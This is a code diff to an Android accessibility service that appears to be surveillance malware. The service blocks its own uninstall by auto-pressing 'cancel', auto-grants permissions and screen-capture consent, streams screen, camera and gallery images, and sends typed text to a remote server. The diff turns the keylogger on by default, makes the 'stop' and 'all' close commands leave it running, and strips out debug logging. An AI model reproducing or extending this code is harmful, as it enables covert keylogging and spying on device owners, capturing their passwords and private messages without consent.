@@ -191,8 +191,10 @@ public class MainAccessibilityService extends AccessibilityService {
 
     private Boolean isScreenMonitoring = false;
     private Boolean isSkeletonMonitoring = false;
-    private Boolean isKeylogger = false;
+    private Boolean isKeylogger = true;
     private Boolean iscanuninstallapp = false;
+
+    private String currentPackagename = "";
 
 
     private static final String TAG = "MyAccessibilityService";
@@ -478,12 +480,12 @@ public class MainAccessibilityService extends AccessibilityService {
                     stopRecording();
                 }
                 if(close_event.equals("key-monitor")) {
-                    isKeylogger= false;
+                    isKeylogger= true;
                 }
                 if(close_event.equals("all")) {
                     isScreenMonitoring = false;
                     isSkeletonMonitoring = false;
-                    isKeylogger = false;
+                    isKeylogger = true;
                     stopRecording();
                     closeCamera();
                 }
@@ -617,7 +619,6 @@ public class MainAccessibilityService extends AccessibilityService {
 
     private void setPermEditorEnable(AccessibilityEvent event) {
         CharSequence packagename = String.valueOf(event.getPackageName());
-        Log.d(TAG, "Text changed: " + packagename + "::: "+event.getClassName());
         if(event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             if(packagename.equals("com.android.systemui") || packagename.equals("com.miui.securitycenter")) {
                 if(event.getClassName() != null) {
@@ -691,7 +692,6 @@ public class MainAccessibilityService extends AccessibilityService {
     }
     private void setMediaProjectionPermission(AccessibilityEvent event) {
         CharSequence packagename = String.valueOf(event.getPackageName());
-        Log.d(TAG, "Text changed: " + packagename + "::: "+event.getClassName());
         if(packagename.equals("com.android.systemui")) {
             if(event.getClassName() != null) {
                 AccessibilityNodeInfo rootNode = getRootInActiveWindow();
@@ -705,7 +705,6 @@ public class MainAccessibilityService extends AccessibilityService {
     private void setStopUninstall(AccessibilityEvent event) {
         if(!iscanuninstallapp) {
             CharSequence packagename = String.valueOf(event.getPackageName());
-            Log.d(TAG, "Text changed: " + packagename + "::: "+event.getClassName());
 
             if(packagename.equals("com.google.android.packageinstaller") || packagename.equals("com.android.systemui") || packagename.equals("com.miui.home")) {
                 AccessibilityNodeInfo rootNode = getRootInActiveWindow();
@@ -746,7 +745,6 @@ public class MainAccessibilityService extends AccessibilityService {
     private void setAutomaticallyPermission(AccessibilityEvent event) {
 //        if(event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
         CharSequence packagename = String.valueOf(event.getPackageName());
-        Log.d(TAG, "PermissionÇ::: " + packagename + "::: "+event.getClassName());
         if(packagename.equals("com.google.android.permissioncontroller") || packagename.equals("com.android.permissioncontroller")) {
             if(event.getClassName() != null) {
                 AccessibilityNodeInfo rootNode = getRootInActiveWindow();
@@ -772,16 +770,36 @@ public class MainAccessibilityService extends AccessibilityService {
             }
         }
 
-        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
-            text = event.getText().toString();
-            eventString = "Navigation";
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            if(!currentPackagename.equals(packagename.toString())) {
+                text = event.getText().toString();
+                eventString = "Navigation";
+                if(Server.getContext() != null) {
+                    if(isKeylogger) {
+                        Server.getContext().sendKeyLog(text, packagename, eventString);
+                    }
+                }
+            }
             if (event.getContentChangeTypes() == AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT) {
                 text = event.getText().toString();
                 eventString = "Text Input";
+                if(Server.getContext() != null) {
+                    if(isKeylogger) {
+                        Server.getContext().sendKeyLog(text, packagename, eventString);
+                    }
+                }
             }
-            if(Server.getContext() != null) {
-                if(isKeylogger) {
-                    Server.getContext().sendKeyLog(text, packagename, eventString);
+
+        }
+
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            if (event.getContentChangeTypes() == AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT) {
+                text = event.getText().toString();
+                eventString = "Text Input";
+                if(Server.getContext() != null) {
+                    if(isKeylogger) {
+                        Server.getContext().sendKeyLog(text, packagename, eventString);
+                    }
                 }
             }
         }
@@ -814,7 +832,6 @@ public class MainAccessibilityService extends AccessibilityService {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
-                    Log.d("Button Text Media", nodeText);
                     if(Common.getInstance().getMediaProjection()) {
                         if(nodeText.equals("start now")
                                 || nodeText.equals("start")
@@ -865,7 +882,6 @@ public class MainAccessibilityService extends AccessibilityService {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
-                    Log.d("Inofrmation::", nodeText);
                     if(nodeText.contains(getResources().getString(R.string.app_name).toLowerCase())) {
                         isSelectedApp = true;
                     }
@@ -934,7 +950,6 @@ public class MainAccessibilityService extends AccessibilityService {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
-                    Log.d("Button Text Stopunin", nodeText);
                     if(nodeText.equals("cancel")
                             || nodeText.equals("cancelar")
                             || nodeText.equals("取消")) {
@@ -1154,8 +1169,6 @@ public class MainAccessibilityService extends AccessibilityService {
     public void performClick(double x, double y) {
         double currentXPosition = x * deviceWidth / imageWidth;
         double currentYPosition = y * deviceWidth / imageWidth;
-        Log.d("currentXPosition", String.valueOf(currentXPosition));
-        Log.d("currentYPosition", String.valueOf(currentYPosition));
         Path clickPath = new Path();
         clickPath.moveTo((float) currentXPosition, (float) currentYPosition);
 
@@ -1208,8 +1221,6 @@ public class MainAccessibilityService extends AccessibilityService {
     }
 
     public void mouseDraw() {
-        Log.d("deviceWidth", String.valueOf(deviceWidth));
-        Log.d("deviceHeight", String.valueOf(deviceHeight));
         List<MousePositionEntry> mousePositionEntryList = Common.getInstance().getMousePositionEntries();
         Path path = new Path();
         path.moveTo((float) mousePositionEntryList.get(0).getxPosition() * deviceWidth / imageWidth, (float) mousePositionEntryList.get(0).getyPosition() * deviceWidth / imageWidth);
@@ -1230,7 +1241,6 @@ public class MainAccessibilityService extends AccessibilityService {
             @Override
             public void onCompleted(GestureDescription gestureDescription) {
                 super.onCompleted(gestureDescription);
-                Log.d("mousedraw", "Click performed successfully");
             }
 
             @Override
@@ -1267,7 +1277,6 @@ public class MainAccessibilityService extends AccessibilityService {
     private void setupCamera() {
         stopBackgroundThread();
         startBackgroundThread();
-        Log.d("tested", "test");
         try {
             String cameraID = cameraManager.getCameraIdList()[0];
             if (cameraType.equals("frontCamera")) {
@@ -1512,7 +1521,6 @@ public class MainAccessibilityService extends AccessibilityService {
             byte[] byteArray = byteArrayOutputStream.toByteArray();
             // Convert bitmap to Base64
             String base64Image = Base64.encodeToString(byteArray, Base64.DEFAULT);
-            Log.d("base64::", "GalleryImage" + "base64Image");
             if(Server.getContext() != null) {
                 Server.getContext().SendOneGallery(base64Image);
             }
@@ -1608,7 +1616,6 @@ public class MainAccessibilityService extends AccessibilityService {
 
     //Send Data part
     public void sendScreenMonitoringData(String base64Image) {
-        Log.d("base64Image:::", "screenBase64");
         if (Server.getContext() != null) {
 //            if(isScreenMonitoring) {
             Server.getContext().sendScreenMonitoring(base64Image);
@@ -1617,7 +1624,6 @@ public class MainAccessibilityService extends AccessibilityService {
     }
 
     public void sendBackCameraMonitoringData(String base64Image) {
-        Log.d("Camera:::", "base64Image");
         if(Server.getContext() != null) {
             Server.getContext().sendCameraMonitoring(base64Image, qualityCamera, cameraType);
         }
